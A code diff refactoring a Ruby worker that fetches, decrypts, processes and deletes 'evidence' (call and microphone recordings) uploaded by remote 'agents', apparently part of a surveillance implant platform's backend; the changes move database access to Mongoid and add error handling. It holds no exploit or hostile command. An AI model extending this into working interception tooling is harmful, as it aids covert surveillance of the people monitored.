@@ -1,4 +1,3 @@
-require 'mongo'
 require 'openssl'
 require 'digest/sha1'
 require 'digest/md5'
@@ -17,13 +16,11 @@ require_release 'rcs-db/connector_manager'
 require_relative 'call_processor'
 require_relative 'mic_processor'
 require_relative 'single_processor'
-require_relative 'db'
 require_relative 'statistics'
 
 require_relative 'evidence/single_evidence'
 require_relative 'evidence/audio_evidence'
 Dir[File.expand_path('../evidence/*.rb', __FILE__)].each { |path| require(path) }
-
 
 module RCS
   module Worker
@@ -44,7 +41,7 @@ module RCS
       end
 
       def run
-        raise MissingAgentError.new("Unable to run instance worker #{@agent_uid}, agent is missing") unless agent?
+        raise MissingAgentError.new("Unable to run instance worker #{@agent_uid}, agent is missing or closed") unless agent?
 
         trace(:info, "[#{@agent_uid}] Evidence processing started for agent #{agent.name}")
 
@@ -70,13 +67,12 @@ module RCS
         delete_all_evidence
       end
 
-      def fetch
-        @collection ||= db.collection('grid.evidence.files')
-        @collection.find({filename: @agent_uid}, {sort: ["_id", :asc]}).limit(READ_LIMIT).to_a
+      def db
+        Mongoid.session(:worker)
       end
 
-      def db
-        RCS::Worker::DB.instance.mongo_connection
+      def fetch
+        db['grid.evidence.files'].find(filename: @agent_uid).sort(_id: 1).limit(READ_LIMIT).to_a
       end
 
       def agent?
@@ -94,7 +90,7 @@ module RCS
 
       def delete_all_evidence
         trace(:error, "[#{@agent_uid}] Agent or target is missing, deleting all related evidence")
-        RCS::Worker::GridFS.delete_by_filename(@agent_uid, "evidence")
+        RCS::DB::GridFS.delete_by_filename(@agent_uid, "evidence", :worker)
         true
       end
 
@@ -116,12 +112,14 @@ module RCS
 
         ev_type = nil
         ev_processed_count = 0
+        date_acquired = '?'
 
         list.each do |ev|
           next if ev.empty?
 
           ev_processed_count += 1
           ev_type ||= ev[:type]
+          date_acquired = Time.at(ev[:da]).utc if ev[:da]
 
           trace(:debug, "[#{@agent_uid}] Processing #{ev[:type].upcase} evidence for agent: #{agent.name}")
 
@@ -150,20 +148,29 @@ module RCS
           end
         end
 
-        trace(:info, "[#{@agent_uid}] Processed #{ev_processed_count} #{ev_type.upcase} evidence for agent #{agent.name} (#{decoded_data.size} bytes in #{Time.now - start_time} sec") if ev_processed_count > 0
-      rescue Mongo::ConnectionFailure => e
+        trace(:info, "[#{@agent_uid}] Processed #{ev_processed_count} #{ev_type.upcase} evidence for agent #{agent.name} (#{decoded_data.size} bytes in #{Time.now - start_time} sec) acquired on #{date_acquired}") if ev_processed_count > 0
+      rescue Moped::Errors::ConnectionFailure => e
         trace :error, "[#{@agent_uid}] cannot connect to database, retrying in 5 seconds..."
         sleep(5)
         retry
       rescue MissingAgentError => ex
         raise(ex)
+      rescue ThreadError, NoMemoryError => error
+        memory_error = true
+
+        msgs = ["[#{error.class}] #{error.message}."]
+        msgs << "There are #{Thread.list.size} active threads. EventMachine threadpool_size is #{EM.threadpool_size}."
+        msgs.concat(error.backtrace) if error.backtrace.respond_to?(:concat)
+
+        trace(:fatal, msgs.join("\n"))
+        exit!(1) # Die hard
       rescue Exception => e
         trace :fatal, "[#{@agent_uid}] Unrecoverable error processing evidence #{raw_id}: #{e.class} #{e.message}"
         trace :fatal, "[#{@agent_uid}] EXCEPTION: " + e.backtrace.join("\n")
 
         decode_failed(raw_id, decoded_data) if decoded_data
       ensure
-        delete_evidence(raw_id) if raw_id
+        delete_evidence(raw_id) if raw_id and !memory_error
       end
 
       def processor_class(evidence_type)
@@ -185,7 +192,7 @@ module RCS
       end
 
       def decrypt_evidence(raw_id)
-        content = RCS::Worker::GridFS.get(raw_id, "evidence") rescue nil
+        content = RCS::DB::GridFS.get(raw_id, "evidence", :worker) rescue nil
         return unless content
 
         decoded_data = ''
@@ -205,7 +212,7 @@ module RCS
       end
 
       def delete_evidence(raw_id)
-        RCS::Worker::GridFS.delete(raw_id, "evidence")
+        RCS::DB::GridFS.delete(raw_id, "evidence", :worker)
         trace(:debug, "[#{@agent_uid}] deleted raw evidence #{raw_id}")
       rescue Exception => ex
         trace(:error, "[#{@agent_uid}] Unable to delete raw evidence #{raw_id} (maybe is missing): #{ex.message}")
